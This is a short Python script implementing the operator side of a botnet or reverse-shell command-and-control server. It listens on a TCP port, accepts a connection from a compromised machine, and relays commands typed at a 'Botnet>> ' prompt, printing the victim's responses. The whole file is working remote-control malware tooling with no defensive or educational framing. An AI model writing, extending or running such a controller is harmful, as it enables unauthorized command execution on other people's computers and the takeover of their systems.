import socket
import json


class Server:
    def __init__(self, ip, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((ip, port))
        print('Waiting for upcoming connections...')
        self.sock.listen(66)
        self.target, address = self.sock.accept()
        print(f'Connection  from {address}')

    def send_data(self, data):
        json_data = json.dumps(data)
        self.target.send(json_data.encode("ISO-8859-1"))

    def receive_data(self):
        json_data = ''
        while True:
            try:
                json_data += self.target.recv(1024).decode("ISO-8859-1")
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = input('Botnet>> ')
            command = command.split(' ')

            try:
                self.send_data(command)
                result = self.receive_data()
                print(result)

            except Exception as exc:
                print(f'Server error, check your command. Error: {exc}')


if __name__ == '__main__':
    srv = Server('192.168.31.151', 6666)
    srv.run()
